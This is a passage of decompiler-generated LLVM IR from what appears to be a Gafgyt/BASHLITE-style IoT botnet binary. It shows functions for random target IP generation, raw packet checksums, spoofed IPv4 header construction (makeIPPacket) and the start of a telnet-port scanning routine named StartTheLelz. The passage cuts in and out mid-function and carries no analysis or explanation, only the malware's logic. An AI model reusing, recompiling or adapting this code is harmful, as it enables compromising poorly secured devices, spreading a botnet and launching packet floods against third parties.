  %v11_8049ba8 = icmp eq i8 %stack_var_-15.0, -88
  br i1 %v11_8049ba8, label %dec_label_pc_8049aa7, label %dec_label_pc_8049bb0

dec_label_pc_8049bb0:                             ; preds = %dec_label_pc_8049b9e, %dec_label_pc_8049ba5
  %v6_8049bb0 = phi i32 [ %v7_8049ba5, %dec_label_pc_8049ba5 ], [ %v8_8049b9e, %dec_label_pc_8049b9e ]
  %v7_8049bb0 = and i32 %v6_8049bb0, -256
  %v8_8049bb0 = or i32 %v7_8049bb0, %v4_8049b0f
  %v11_8049bb3 = icmp eq i8 %stack_var_-16.0, -58
  %v1_8049bb5 = icmp eq i1 %v11_8049bb3, false
  br i1 %v1_8049bb5, label %dec_label_pc_8049bcd.thread, label %dec_label_pc_8049bb7

dec_label_pc_8049bcd.thread:                      ; preds = %dec_label_pc_8049bb0
  %v7_8049bcd43 = and i32 %v8_8049bb0, -256
  %v8_8049bcd44 = or i32 %v7_8049bcd43, %v4_8049b0f
  br label %dec_label_pc_8049be6

dec_label_pc_8049bb7:                             ; preds = %dec_label_pc_8049bb0
  %v4_8049bb7 = zext i8 %stack_var_-15.0 to i32
  %v6_8049bb7 = and i32 %v8_8049bb0, -256
  %v7_8049bb7 = or i32 %v6_8049bb7, %v4_8049bb7
  store i32 %v7_8049bb7, i32* @eax, align 4
  %v10_8049bba = icmp eq i8 %stack_var_-15.0, 18
  br i1 %v10_8049bba, label %dec_label_pc_8049aa7, label %dec_label_pc_8049bc2

dec_label_pc_8049bc2:                             ; preds = %dec_label_pc_8049bb7
  store i32 %v7_8049bb7, i32* @eax, align 4
  %v10_8049bc5 = icmp eq i8 %stack_var_-15.0, 19
  br i1 %v10_8049bc5, label %dec_label_pc_8049aa7, label %dec_label_pc_8049bd4

dec_label_pc_8049bd4:                             ; preds = %dec_label_pc_8049bc2
  %v8_8049bcd = or i32 %v6_8049bb0, %v4_8049b0f
  %v6_8049bd4 = and i32 %v8_8049bcd, -256
  %v7_8049bd4 = or i32 %v6_8049bd4, %v4_8049bb7
  %v10_8049bd7 = icmp eq i8 %stack_var_-15.0, 51
  %v1_8049bd9 = icmp eq i1 %v10_8049bd7, false
  br i1 %v1_8049bd9, label %dec_label_pc_8049be6, label %dec_label_pc_8049bdb

dec_label_pc_8049bdb:                             ; preds = %dec_label_pc_8049bd4
  %v4_8049bdb = zext i8 %stack_var_-14.0 to i32
  %v7_8049bdb = or i32 %v6_8049bd4, %v4_8049bdb
  store i32 %v7_8049bdb, i32* @eax, align 4
  %v10_8049bde = icmp eq i8 %stack_var_-14.0, 100
  br i1 %v10_8049bde, label %dec_label_pc_8049aa7, label %dec_label_pc_8049be6

dec_label_pc_8049be6:                             ; preds = %dec_label_pc_8049bcd.thread, %dec_label_pc_8049bdb, %dec_label_pc_8049bd4
  %v6_8049be6 = phi i32 [ %v7_8049bdb, %dec_label_pc_8049bdb ], [ %v7_8049bd4, %dec_label_pc_8049bd4 ], [ %v8_8049bcd44, %dec_label_pc_8049bcd.thread ]
  %v7_8049be6 = and i32 %v6_8049be6, -256
  %v8_8049be6 = or i32 %v7_8049be6, %v4_8049b0f
  %v11_8049be9 = icmp eq i8 %stack_var_-16.0, -53
  %v1_8049beb = icmp eq i1 %v11_8049be9, false
  br i1 %v1_8049beb, label %dec_label_pc_8049bff, label %dec_label_pc_8049bed

dec_label_pc_8049bed:                             ; preds = %dec_label_pc_8049be6
  %v4_8049bed = zext i8 %stack_var_-15.0 to i32
  %v6_8049bed = and i32 %v8_8049be6, -256
  %v7_8049bed = or i32 %v6_8049bed, %v4_8049bed
  %v4_8049bf0 = icmp eq i8 %stack_var_-15.0, 0
  %v1_8049bf2 = icmp eq i1 %v4_8049bf0, false
  br i1 %v1_8049bf2, label %dec_label_pc_8049bff, label %dec_label_pc_8049bf4

dec_label_pc_8049bf4:                             ; preds = %dec_label_pc_8049bed
  %v4_8049bf4 = zext i8 %stack_var_-14.0 to i32
  %v7_8049bf4 = or i32 %v6_8049bed, %v4_8049bf4
  store i32 %v7_8049bf4, i32* @eax, align 4
  %v10_8049bf7 = icmp eq i8 %stack_var_-14.0, 113
  br i1 %v10_8049bf7, label %dec_label_pc_8049aa7, label %dec_label_pc_8049bff

dec_label_pc_8049bff:                             ; preds = %dec_label_pc_8049bf4, %dec_label_pc_8049bed, %dec_label_pc_8049be6
  %v6_8049bff = phi i32 [ %v7_8049bf4, %dec_label_pc_8049bf4 ], [ %v7_8049bed, %dec_label_pc_8049bed ], [ %v8_8049be6, %dec_label_pc_8049be6 ]
  %v7_8049bff = and i32 %v6_8049bff, -256
  %v8_8049bff = or i32 %v7_8049bff, %v4_8049b0f
  store i32 %v8_8049bff, i32* @eax, align 4
  %tmp47 = icmp ult i8 %stack_var_-16.0, -32
  br i1 %tmp47, label %dec_label_pc_8049c0a, label %dec_label_pc_8049aa7

dec_label_pc_8049c0a:                             ; preds = %dec_label_pc_8049bff
  store i32 0, i32* %stack_var_-32, align 4
  %v4_8049c26 = urem i32 %extract.t, 256
  store i32 %v4_8049c26, i32* @edx, align 4
  %v4_8049c30 = zext i8 %stack_var_-14.0 to i32
  %v4_8049c3a = zext i8 %stack_var_-15.0 to i32
  store i32 %v4_8049c3a, i32* @ebx, align 4
  %v1_8049c47 = urem i32 %v4_8049b0f, 256
  %v2_8049c4c = ptrtoint i32* %stack_var_-32 to i32
  %v7_8049c5c = call i32 @zprintf(i32 %v2_8049c4c, i32 ptrtoint ([12 x i8]* @global_var_8052983.32 to i32), i32 %v1_8049c47, i32 %v4_8049c3a, i32 %v4_8049c30, i32 %v4_8049c26)
  %v1_8049c6b = call i32 @inet_addr(i32 %v2_8049c4c)
  %v2_8049c76 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_8049c76, i32* @ebx, align 4
  store i32 %v0_8049a31, i32* @esi, align 4
  ret i32 %v1_8049c6b

; uselistorder directives
  uselistorder i32 %v4_8049c26, { 1, 0 }
  uselistorder i32 %v8_8049bb0, { 1, 0 }
  uselistorder i32 %v6_8049b6c, { 1, 0 }
  uselistorder i32 %v7_8049b5a, { 1, 0 }
  uselistorder i32 %v7_8049b24, { 2, 1, 0 }
  uselistorder i32 %v4_8049b0f, { 0, 3, 4, 2, 5, 6, 7, 8, 1, 9, 10, 11, 12, 13, 14 }
  uselistorder i8 %stack_var_-16.0, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 10, 9 }
  uselistorder i8 %stack_var_-14.0, { 0, 1, 8, 2, 7, 3, 6, 4, 5 }
  uselistorder i8 %stack_var_-15.0, { 0, 17, 16, 1, 2, 3, 15, 4, 5, 14, 13, 6, 12, 7, 11, 9, 8, 10 }
  uselistorder i32* %stack_var_-32, { 1, 0 }
  uselistorder i64 255, { 2, 0, 1, 3, 4 }
  uselistorder label %dec_label_pc_8049be6, { 1, 2, 0 }
  uselistorder label %dec_label_pc_8049bb0, { 1, 0 }
  uselistorder label %dec_label_pc_8049b0f, { 1, 0 }
  uselistorder label %dec_label_pc_8049aa7, { 1, 2, 3, 4, 5, 6, 7, 8, 0, 9, 10, 11, 12, 13 }
}

define i32 @getRandomIP(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v0_8049c80 = load i32, i32* @global_var_805b4a0.33, align 32
  %v1_8049c89 = call i32 @ntohl(i32 %v0_8049c80)
  %v5_8049c91 = and i32 %v1_8049c89, %arg1
  %v1_8049c97 = call i32 @rand_cmwc(i32 %v5_8049c91)
  %v1_8049ca1 = sub i32 -1, %arg1
  %v2_8049ca3 = and i32 %v1_8049c97, %v1_8049ca1
  %v5_8049ca5 = xor i32 %v2_8049ca3, %v5_8049c91
  ret i32 %v5_8049ca5
}

define i32 @csum(i16* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v0_8049caf = load i32, i32* @ebx, align 4
  %v4_8049ce333 = add i32 %arg2, -1
  %v9_8049ce334 = sub i32 0, %arg2
  %v10_8049ce335 = and i32 %arg2, %v9_8049ce334
  %v11_8049ce336 = icmp slt i32 %v10_8049ce335, 0
  %v12_8049ce337 = icmp eq i32 %v4_8049ce333, 0
  %v13_8049ce338 = icmp slt i32 %v4_8049ce333, 0
  %v3_8049ce739 = icmp eq i1 %v13_8049ce338, %v11_8049ce336
  %v4_8049ce740 = icmp eq i1 %v12_8049ce337, false
  %v5_8049ce741 = and i1 %v4_8049ce740, %v3_8049ce739
  br i1 %v5_8049ce741, label %dec_label_pc_8049cc3.lr.ph, label %dec_label_pc_8049ce9

dec_label_pc_8049cc3.lr.ph:                       ; preds = %entry
  %v4_8049cc6.pre = load i32, i32* @ecx, align 4
  br label %dec_label_pc_8049cc3

dec_label_pc_8049cc3:                             ; preds = %dec_label_pc_8049cc3.lr.ph, %dec_label_pc_8049cc3
  %v4_8049cc6 = phi i32 [ %v4_8049cc6.pre, %dec_label_pc_8049cc3.lr.ph ], [ %v6_8049cc6, %dec_label_pc_8049cc3 ]
  %stack_var_-24.045 = phi i16 [ 0, %dec_label_pc_8049cc3.lr.ph ], [ %v9_8049cd8, %dec_label_pc_8049cc3 ]
  %stack_var_8.044 = phi i32 [ %arg2, %dec_label_pc_8049cc3.lr.ph ], [ %v4_8049cdf, %dec_label_pc_8049cc3 ]
  %stack_var_4.043 = phi i16* [ %arg1, %dec_label_pc_8049cc3.lr.ph ], [ %v23_8049cdb, %dec_label_pc_8049cc3 ]
  %v3_8049cd542 = phi i32 [ 0, %dec_label_pc_8049cc3.lr.ph ], [ %v6_8049cd5, %dec_label_pc_8049cc3 ]
  %v4_8049cc3 = ptrtoint i16* %stack_var_4.043 to i32
  %v2_8049cc6 = load i16, i16* %stack_var_4.043, align 2
  %v3_8049cc6 = zext i16 %v2_8049cc6 to i32
  %v5_8049cc6 = and i32 %v4_8049cc6, -65536
  %v6_8049cc6 = or i32 %v5_8049cc6, %v3_8049cc6
  store i32 %v6_8049cc6, i32* @ecx, align 4
  %sext51 = mul i32 %v3_8049cd542, 65536
  %v4_8049cd5 = sdiv i32 %sext51, 65536
  %v6_8049cd5 = add nsw i32 %v3_8049cc6, %v4_8049cd5
  %v11_8049cd5 = icmp ult i32 %v6_8049cd5, %v4_8049cd5
  %v26_8049cd5 = trunc i32 %v6_8049cd5 to i16
  %v7_8049cd8 = zext i1 %v11_8049cd5 to i16
  %v9_8049cd8 = add i16 %v7_8049cd8, %stack_var_-24.045
  %v5_8049cdb = add i32 %v4_8049cc3, 2
  %v23_8049cdb = inttoptr i32 %v5_8049cdb to i16*
  %v4_8049cdf = add i32 %stack_var_8.044, -2
  %v4_8049ce3 = add i32 %stack_var_8.044, -3
  %v9_8049ce3 = sub i32 2, %stack_var_8.044
  %v10_8049ce3 = and i32 %v4_8049cdf, %v9_8049ce3
  %v11_8049ce3 = icmp slt i32 %v10_8049ce3, 0
  %v12_8049ce3 = icmp eq i32 %v4_8049ce3, 0
  %v13_8049ce3 = icmp slt i32 %v4_8049ce3, 0
  %v3_8049ce7 = icmp eq i1 %v13_8049ce3, %v11_8049ce3
  %v4_8049ce7 = icmp eq i1 %v12_8049ce3, false
  %v5_8049ce7 = and i1 %v4_8049ce7, %v3_8049ce7
  br i1 %v5_8049ce7, label %dec_label_pc_8049cc3, label %dec_label_pc_8049ce9

dec_label_pc_8049ce9:                             ; preds = %dec_label_pc_8049cc3, %entry
  %v3_8049cd5.lcssa = phi i16 [ 0, %entry ], [ %v26_8049cd5, %dec_label_pc_8049cc3 ]
  %stack_var_4.0.lcssa = phi i16* [ %arg1, %entry ], [ %v23_8049cdb, %dec_label_pc_8049cc3 ]
  %stack_var_8.0.lcssa = phi i32 [ %arg2, %entry ], [ %v4_8049cdf, %dec_label_pc_8049cc3 ]
  %stack_var_-24.0.lcssa = phi i16 [ 0, %entry ], [ %v9_8049cd8, %dec_label_pc_8049cc3 ]
  %tmp18 = icmp slt i32 %stack_var_8.0.lcssa, 1
  br i1 %tmp18, label %dec_label_pc_8049d2d.preheader, label %dec_label_pc_8049cef

dec_label_pc_8049cef:                             ; preds = %dec_label_pc_8049ce9
  %v1_8049cf2 = bitcast i16* %stack_var_4.0.lcssa to i8*
  %v2_8049cf2 = load i8, i8* %v1_8049cf2, align 1
  %v3_8049cf2 = zext i8 %v2_8049cf2 to i32
  %v4_8049cf2 = load i32, i32* @ecx, align 4
  %v5_8049cf2 = and i32 %v4_8049cf2, -256
  %v6_8049cf2 = or i32 %v5_8049cf2, %v3_8049cf2
  store i32 %v6_8049cf2, i32* @ecx, align 4
  %v4_8049d00 = sext i16 %v3_8049cd5.lcssa to i32
  %v6_8049d00 = add nsw i32 %v3_8049cf2, %v4_8049d00
  %v11_8049d00 = icmp ult i32 %v6_8049d00, %v4_8049d00
  %v26_8049d00 = trunc i32 %v6_8049d00 to i16
  %v7_8049d03 = zext i1 %v11_8049d00 to i16
  %v9_8049d03 = add i16 %v7_8049d03, %stack_var_-24.0.lcssa
  br label %dec_label_pc_8049d2d.preheader

dec_label_pc_8049d2d.preheader:                   ; preds = %dec_label_pc_8049cef, %dec_label_pc_8049ce9
  %v3_8049d12.ph = phi i16 [ %v3_8049cd5.lcssa, %dec_label_pc_8049ce9 ], [ %v26_8049d00, %dec_label_pc_8049cef ]
  %stack_var_-24.1.ph = phi i16 [ %stack_var_-24.0.lcssa, %dec_label_pc_8049ce9 ], [ %v9_8049d03, %dec_label_pc_8049cef ]
  %v4_8049d2d20 = sext i16 %v3_8049d12.ph to i32
  %v4_8049d3021 = sext i16 %stack_var_-24.1.ph to i32
  %v3_8049d3322 = udiv i32 %v4_8049d2d20, 65536
  %v4_8049d3323 = mul i32 %v4_8049d3021, 65536
  %v5_8049d3324 = or i32 %v4_8049d3323, %v3_8049d3322
  %v2_8049d3725 = udiv i32 %v4_8049d3021, 65536
  %v2_8049d3a26 = or i32 %v5_8049d3324, %v2_8049d3725
  %v3_8049d3a27 = icmp eq i32 %v2_8049d3a26, 0
  %v1_8049d3e28 = icmp eq i1 %v3_8049d3a27, false
  br i1 %v1_8049d3e28, label %dec_label_pc_8049d08, label %dec_label_pc_8049d40

dec_label_pc_8049d08:                             ; preds = %dec_label_pc_8049d2d.preheader, %dec_label_pc_8049d08
  %v2_8049d3731 = phi i32 [ %v2_8049d37, %dec_label_pc_8049d08 ], [ %v2_8049d3725, %dec_label_pc_8049d2d.preheader ]
  %v5_8049d3330 = phi i32 [ %v5_8049d33, %dec_label_pc_8049d08 ], [ %v5_8049d3324, %dec_label_pc_8049d2d.preheader ]
  %v4_8049d2d29 = phi i32 [ %v4_8049d2d, %dec_label_pc_8049d08 ], [ %v4_8049d2d20, %dec_label_pc_8049d2d.preheader ]
  %v2_8049d23 = add i32 %v5_8049d3330, %v4_8049d2d29
  %v7_8049d23 = icmp ult i32 %v2_8049d23, %v4_8049d2d29
  %v3_8049d25 = zext i1 %v7_8049d23 to i32
  %v5_8049d25 = add nuw nsw i32 %v3_8049d25, %v2_8049d3731
  %sext = mul i32 %v2_8049d23, 65536
  %v4_8049d2d = sdiv i32 %sext, 65536
  %sext50 = mul i32 %v5_8049d25, 65536
  %v4_8049d30 = sdiv i32 %sext50, 65536
  %v3_8049d33 = udiv i32 %v4_8049d2d, 65536
  %v5_8049d33 = or i32 %sext50, %v3_8049d33
  %v2_8049d37 = udiv i32 %v4_8049d30, 65536
  %v2_8049d3a = or i32 %v5_8049d33, %v2_8049d37
  %v3_8049d3a = icmp eq i32 %v2_8049d3a, 0
  %v1_8049d3e = icmp eq i1 %v3_8049d3a, false
  br i1 %v1_8049d3e, label %dec_label_pc_8049d08, label %dec_label_pc_8049d2d.dec_label_pc_8049d40_crit_edge

dec_label_pc_8049d2d.dec_label_pc_8049d40_crit_edge: ; preds = %dec_label_pc_8049d08
  store i32 %v5_8049d3330, i32* @ecx, align 4
  br label %dec_label_pc_8049d40

dec_label_pc_8049d40:                             ; preds = %dec_label_pc_8049d2d.dec_label_pc_8049d40_crit_edge, %dec_label_pc_8049d2d.preheader
  %v4_8049d2d.lcssa = phi i32 [ %v4_8049d2d, %dec_label_pc_8049d2d.dec_label_pc_8049d40_crit_edge ], [ %v4_8049d2d20, %dec_label_pc_8049d2d.preheader ]
  %v1_8049d43 = urem i32 %v4_8049d2d.lcssa, 65536
  %v1_8049d45 = xor i32 %v1_8049d43, 65535
  store i32 %v0_8049caf, i32* @ebx, align 4
  ret i32 %v1_8049d45

; uselistorder directives
  uselistorder i32 %v5_8049d33, { 1, 0 }
  uselistorder i32 %v4_8049d2d, { 1, 0, 2 }
  uselistorder i32 %v2_8049d3725, { 1, 0 }
  uselistorder i32 %v4_8049d3021, { 1, 0 }
  uselistorder i32 %v4_8049d2d20, { 2, 1, 0 }
  uselistorder i32 %v4_8049d00, { 1, 0 }
  uselistorder i16 %stack_var_-24.0.lcssa, { 1, 0 }
  uselistorder i16 %v3_8049cd5.lcssa, { 1, 0 }
  uselistorder i32 %v4_8049ce3, { 1, 0 }
  uselistorder i32 %v6_8049cd5, { 1, 2, 0 }
  uselistorder i32 %v4_8049cd5, { 1, 0 }
  uselistorder i32 %v6_8049cc6, { 1, 0 }
  uselistorder label %dec_label_pc_8049d08, { 1, 0 }
  uselistorder label %dec_label_pc_8049cc3, { 1, 0 }
}

define i32 @tcpcsum() local_unnamed_addr {
entry:
  %ecx.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %tmp1 = call i32 @__decompiler_undefined_function_0()
  %tmp9 = call i32 @__decompiler_undefined_function_0()
  %v1_8049d66 = add i32 %tmp9, 12
  %v2_8049d66 = inttoptr i32 %v1_8049d66 to i32*
  %v3_8049d66 = load i32, i32* %v2_8049d66, align 4
  %v1_8049d6f = add i32 %tmp9, 16
  %v2_8049d6f = inttoptr i32 %v1_8049d6f to i32*
  %v3_8049d6f = load i32, i32* %v2_8049d6f, align 4
  %v1_8049d82 = call i32 @htons(i32 20)
  %v1_8049d9c = call i32 @malloc(i32 32)
  store i32 %v1_8049d9c, i32* %ecx.global-to-local, align 4
  %v2_8049daf = inttoptr i32 %v1_8049d9c to i32*
  store i32 %v3_8049d66, i32* %v2_8049daf, align 4
  %v1_8049db4 = load i32, i32* %ecx.global-to-local, align 4
  %v2_8049db4 = add i32 %v1_8049db4, 4
  %v3_8049db4 = inttoptr i32 %v2_8049db4 to i32*
  store i32 %v3_8049d6f, i32* %v3_8049db4, align 4
  %v1_8049dba = load i32, i32* %ecx.global-to-local, align 4
  %v2_8049dba = add i32 %v1_8049dba, 8
  %v3_8049dba = inttoptr i32 %v2_8049dba to i32*
  store i32 0, i32* %v3_8049dba, align 4
  store i32 %tmp1, i32* @ecx, align 4
  %v1_8049dc3 = add i32 %v1_8049d9c, 12
  store i32 %v1_8049dc3, i32* %edx.global-to-local, align 4
  %v1_8049dc6 = inttoptr i32 %tmp1 to i32*
  %v2_8049dc6 = load i32, i32* %v1_8049dc6, align 4
  %v2_8049dc8 = inttoptr i32 %v1_8049dc3 to i32*
  store i32 %v2_8049dc6, i32* %v2_8049dc8, align 4
  %v0_8049dca = load i32, i32* @ecx, align 4
  %v1_8049dca = add i32 %v0_8049dca, 4
  %v2_8049dca = inttoptr i32 %v1_8049dca to i32*
  %v3_8049dca = load i32, i32* %v2_8049dca, align 4
  %v1_8049dcd = load i32, i32* %edx.global-to-local, align 4
  %v2_8049dcd = add i32 %v1_8049dcd, 4
  %v3_8049dcd = inttoptr i32 %v2_8049dcd to i32*
  store i32 %v3_8049dca, i32* %v3_8049dcd, align 4
  %v0_8049dd0 = load i32, i32* @ecx, align 4
  %v1_8049dd0 = add i32 %v0_8049dd0, 8
  %v2_8049dd0 = inttoptr i32 %v1_8049dd0 to i32*
  %v3_8049dd0 = load i32, i32* %v2_8049dd0, align 4
  %v1_8049dd3 = load i32, i32* %edx.global-to-local, align 4
  %v2_8049dd3 = add i32 %v1_8049dd3, 8
  %v3_8049dd3 = inttoptr i32 %v2_8049dd3 to i32*
  store i32 %v3_8049dd0, i32* %v3_8049dd3, align 4
  %v0_8049dd6 = load i32, i32* @ecx, align 4
  %v1_8049dd6 = add i32 %v0_8049dd6, 12
  %v2_8049dd6 = inttoptr i32 %v1_8049dd6 to i32*
  %v3_8049dd6 = load i32, i32* %v2_8049dd6, align 4
  %v1_8049dd9 = load i32, i32* %edx.global-to-local, align 4
  %v2_8049dd9 = add i32 %v1_8049dd9, 12
  %v3_8049dd9 = inttoptr i32 %v2_8049dd9 to i32*
  store i32 %v3_8049dd6, i32* %v3_8049dd9, align 4
  %v0_8049ddc = load i32, i32* @ecx, align 4
  %v1_8049ddc = add i32 %v0_8049ddc, 16
  %v2_8049ddc = inttoptr i32 %v1_8049ddc to i32*
  %v3_8049ddc = load i32, i32* %v2_8049ddc, align 4
  %v1_8049ddf = load i32, i32* %edx.global-to-local, align 4
  %v2_8049ddf = add i32 %v1_8049ddf, 16
  %v3_8049ddf = inttoptr i32 %v2_8049ddf to i32*
  store i32 %v3_8049ddc, i32* %v3_8049ddf, align 4
  %v2_8049de8 = inttoptr i32 %v1_8049d9c to i16*
  %v3_8049de8 = call i32 @csum(i16* %v2_8049de8, i32 32)
  %v1_8049dfa = call i32 @free(i32 %v1_8049d9c)
  %v4_8049e02 = urem i32 %v3_8049de8, 65536
  ret i32 %v4_8049e02

; uselistorder directives
  uselistorder i32 %v1_8049d9c, { 2, 3, 4, 1, 0 }
  uselistorder i32 %tmp9, { 1, 0 }
  uselistorder i32 %tmp1, { 1, 0 }
}

define i32 @makeIPPacket() local_unnamed_addr {
entry:
  %tmp = call i32 @__decompiler_undefined_function_0()
  %tmp5 = call i32 @__decompiler_undefined_function_0()
  %tmp6 = call i8* @__decompiler_undefined_function_1()
  %tmp8 = call i8 @__decompiler_undefined_function_2()
  %stack_var_-4 = alloca i32, align 4
  %v0_8049e0d = load i32, i32* @ebp, align 4
  store i32 %v0_8049e0d, i32* %stack_var_-4, align 4
  %v4_8049e13 = sext i8 %tmp8 to i32
  %v4_8049e19 = ptrtoint i8* %tmp6 to i32
  store i8 69, i8* %tmp6, align 1
  %v1_8049e36 = add i32 %v4_8049e19, 1
  %v2_8049e36 = inttoptr i32 %v1_8049e36 to i8*
  store i8 0, i8* %v2_8049e36, align 1
  %v1_8049e3d = add i32 %tmp5, 20
  %v1_8049e43 = trunc i32 %v1_8049e3d to i16
  %v3_8049e43 = add i32 %v4_8049e19, 2
  %v4_8049e43 = inttoptr i32 %v3_8049e43 to i16*
  store i16 %v1_8049e43, i16* %v4_8049e43, align 2
  %v2_8049e47 = call i32 @rand_cmwc(i32 %v4_8049e13)
  %v1_8049e51 = trunc i32 %v2_8049e47 to i16
  %v3_8049e51 = add i32 %v4_8049e19, 4
  %v4_8049e51 = inttoptr i32 %v3_8049e51 to i16*
  store i16 %v1_8049e51, i16* %v4_8049e51, align 2
  %v1_8049e58 = add i32 %v4_8049e19, 6
  %v2_8049e58 = inttoptr i32 %v1_8049e58 to i16*
  store i16 0, i16* %v2_8049e58, align 2
  %v1_8049e61 = add i32 %v4_8049e19, 8
  %v2_8049e61 = inttoptr i32 %v1_8049e61 to i8*
  store i8 -1, i8* %v2_8049e61, align 1
  %v3_8049e6b = add i32 %v4_8049e19, 9
  %v4_8049e6b = inttoptr i32 %v3_8049e6b to i8*
  store i8 %tmp8, i8* %v4_8049e6b, align 1
  %v1_8049e71 = add i32 %v4_8049e19, 10
  %v2_8049e71 = inttoptr i32 %v1_8049e71 to i16*
  store i16 0, i16* %v2_8049e71, align 2
  %v2_8049e7d = add i32 %v4_8049e19, 12
  %v3_8049e7d = inttoptr i32 %v2_8049e7d to i32*
  %v2_8049e86 = add i32 %v4_8049e19, 16
  %v3_8049e86 = inttoptr i32 %v2_8049e86 to i32*
  store i32 %tmp, i32* %v3_8049e86, align 4
  %v2_8049e89 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_8049e89, i32* @ebp, align 4
  ret i32 %tmp

; uselistorder directives
  uselistorder i32 %tmp, { 1, 0 }
  uselistorder i8 -1, { 2, 0, 1 }
}

define i32 @sclose(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-4 = alloca i32, align 4
  %v0_8049e8b = load i32, i32* @ebp, align 4
  store i32 %v0_8049e8b, i32* %stack_var_-4, align 4
  %v4_8049e91 = add i32 %arg1, -2
  %v9_8049e91 = sub i32 1, %arg1
  %v10_8049e91 = and i32 %v9_8049e91, %arg1
  %v11_8049e91 = icmp slt i32 %v10_8049e91, 0
  %v12_8049e91 = icmp eq i32 %v4_8049e91, 0
  %v13_8049e91 = icmp slt i32 %v4_8049e91, 0
  %v3_8049e95 = icmp eq i1 %v13_8049e91, %v11_8049e91
  %v4_8049e95 = icmp eq i1 %v12_8049e91, false
  %v5_8049e95 = and i1 %v4_8049e95, %v3_8049e95
  br i1 %v5_8049e95, label %dec_label_pc_8049ea0, label %dec_label_pc_8049eb5

dec_label_pc_8049ea0:                             ; preds = %entry
  %v1_8049ea6 = call i32 @__libc_close(i32 %arg1)
  %v2_8049eb8.pre = load i32, i32* %stack_var_-4, align 4
  br label %dec_label_pc_8049eb5

dec_label_pc_8049eb5:                             ; preds = %entry, %dec_label_pc_8049ea0
  %v2_8049eb8 = phi i32 [ %v2_8049eb8.pre, %dec_label_pc_8049ea0 ], [ %v0_8049e8b, %entry ]
  %storemerge = phi i32 [ 0, %dec_label_pc_8049ea0 ], [ 1, %entry ]
  store i32 %v2_8049eb8, i32* @ebp, align 4
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %v4_8049e91, { 1, 0 }
  uselistorder i32 %arg1, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_8049eb5, { 1, 0 }
}

define i32 @StartTheLelz() local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %ebx.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %tmp10 = call i8* @__decompiler_undefined_function_1()
  %tmp11 = call i8* @__decompiler_undefined_function_1()
  %tmp12 = call i8* @__decompiler_undefined_function_1()
  %tmp13 = call i32 @__decompiler_undefined_function_0()
  %tmp14 = call i32 @__decompiler_undefined_function_0()
  %tmp15 = call i32 @__decompiler_undefined_function_0()
  %tmp16 = call i32 @__decompiler_undefined_function_0()
  %tmp17 = call i32 @__decompiler_undefined_function_0()
  %tmp18 = call i32 @__decompiler_undefined_function_0()
  %tmp23 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-188 = alloca i32, align 4
  %stack_var_-184 = alloca i32, align 4
  %stack_var_-180 = alloca i32, align 4
  %stack_var_-172 = alloca i32, align 4
  %stack_var_-204 = alloca i32, align 4
  %stack_var_-268 = alloca i32, align 4
  %v0_8049ebf = load i32, i32* @ebx, align 4
  %v15_8049ec0 = ptrtoint i32* %stack_var_-268 to i32
  %v1_8049ec6 = call i32 @getdtablesize(i32 %v0_8049ebf)
  %v2_8049ecf = ashr i32 %v1_8049ec6, 31
  %v2_8049ed2 = udiv i32 %v2_8049ecf, 1073741824
  %v2_8049ed5 = add i32 %v2_8049ed2, %v1_8049ec6
  %v2_8049ed7 = sdiv i32 %v2_8049ed5, 4
  %v2_8049ee0 = mul nsw i32 %v2_8049ed7, 3
  store i32 %v2_8049ee0, i32* %eax.global-to-local, align 4
  %v7_8049ef8 = icmp sgt i32 %v2_8049ee0, 512
  %.v2_8049ee0 = select i1 %v7_8049ef8, i32 512, i32 %v2_8049ee0
  store i32 %.v2_8049ee0, i32* %edx.global-to-local, align 4
  store i32 2, i32* %stack_var_-204, align 4
  %v1_8049f1b = call i32 @htons(i32 23)
  %v2_8049f2a = ptrtoint i32* %stack_var_-204 to i32
  %v2_8049f4b = mul i32 %.v2_8049ee0, 24
  %v1_8049f51 = add i32 %v2_8049f4b, 30
  %v2_8049f54 = and i32 %v1_8049f51, -16
  %v2_8049f5a = sub i32 %v15_8049ec0, %v2_8049f54
  %v1_8049f68 = add i32 %v2_8049f5a, 15
  %v2_8049f6b = and i32 %v1_8049f68, -16
  %v2_8049f88 = mul i32 %.v2_8049ee0, 5
  store i32 %v2_8049f88, i32* %edx.global-to-local, align 4
  %v1_8049f8e = inttoptr i32 %v2_8049f6b to i8*
  store i32 %v2_8049f6b, i32* @edi, align 4
  %v1_8049f93 = and i32 %v1_8049f68, -256
  store i32 %v1_8049f93, i32* %eax.global-to-local, align 4
  %v5_8049f95 = call i8* @_memset(i8* %v1_8049f8e, i32 %v1_8049f93, i32 %v2_8049f88)
  store i32 0, i32* %eax.global-to-local, align 4
  %v5_804a01178 = icmp sgt i32 %v2_8049ed5, 3
  %v2_8049faf = or i32 %v2_8049f6b, 9
  br i1 %v5_804a01178, label %dec_label_pc_8049fa0.lr.ph, label %dec_label_pc_804a013.preheader

dec_label_pc_8049fa0.lr.ph:                       ; preds = %entry
  %v2_8049fd5 = add i32 %v2_8049f6b, 20
  br label %dec_label_pc_8049fa0

dec_label_pc_8049fa0:                             ; preds = %dec_label_pc_8049fa0.lr.ph, %dec_label_pc_8049fa0
  %storemerge579 = phi i32 [ 0, %dec_label_pc_8049fa0.lr.ph ], [ %v4_804a008, %dec_label_pc_8049fa0 ]
  store i32 %storemerge579, i32* %edx.global-to-local, align 4
  %v2_8049fac = mul nuw nsw i32 %storemerge579, 24
  store i32 %v2_8049fac, i32* %eax.global-to-local, align 4
  %v3_8049faf = add i32 %v2_8049faf, %v2_8049fac
  %v4_8049faf = inttoptr i32 %v3_8049faf to i8*
  store i8 1, i8* %v4_8049faf, align 1
  store i32 %storemerge579, i32* @ebx, align 4
  %v0_8049fb7 = load i32, i32* @esp, align 4
  %v1_8049fba = add i32 %v0_8049fb7, -16
  %v2_8049fba = inttoptr i32 %v1_8049fba to i32*
  store i32 1024, i32* %v2_8049fba, align 4
  %v1_8049fbf = call i32 @malloc(i32 %storemerge579)
